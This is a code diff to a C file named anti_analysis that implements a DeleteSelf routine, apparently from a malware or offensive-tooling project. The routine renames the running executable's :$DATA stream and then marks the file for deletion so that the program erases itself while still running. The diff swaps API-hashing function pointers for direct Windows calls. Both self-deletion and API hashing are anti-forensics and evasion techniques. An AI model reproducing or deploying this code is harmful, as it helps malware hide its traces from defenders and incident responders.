@@ -1,9 +1,6 @@
 #include "anti_analysis.h"
 
 
-extern API_HASHING g_Api;
-
-
 BOOL DeleteSelf() {
 
 
@@ -36,7 +33,7 @@ BOOL DeleteSelf() {
 	//--------------------------------------------------------------------------------------------------------------------------
 
 	// used to get the current file name
-	if (g_Api.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
+	if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
 		DebugPrint("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
@@ -45,7 +42,7 @@ BOOL DeleteSelf() {
 	// RENAMING
 
 	// openning a handle to the current file
-	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
 		DebugPrint("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
 		return FALSE;
@@ -55,20 +52,20 @@ BOOL DeleteSelf() {
     WDebugPrint(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);
 
 	// renaming the data stream
-	if (!g_Api.pSetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
+	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
 		DebugPrint("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 	
     WDebugPrint(L"[+] DONE \n");
 
-	g_Api.pCloseHandle(hFile);
+	CloseHandle(hFile);
 
 	//--------------------------------------------------------------------------------------------------------------------------
 	// DELEING
 
 	// openning a new handle to the current file
-	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 	if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
 		// in case the file is already deleted
 		return TRUE;
@@ -81,14 +78,14 @@ BOOL DeleteSelf() {
     WDebugPrint(L"[i] DELETING ...\n");
 
 	// marking for deletion after the file's handle is closed
-	if (!g_Api.pSetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
+	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
 		DebugPrint("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
     WDebugPrint(L"[+] DONE \n");
 
-	g_Api.pCloseHandle(hFile);
+	CloseHandle(hFile);
 
 	//--------------------------------------------------------------------------------------------------------------------------
 
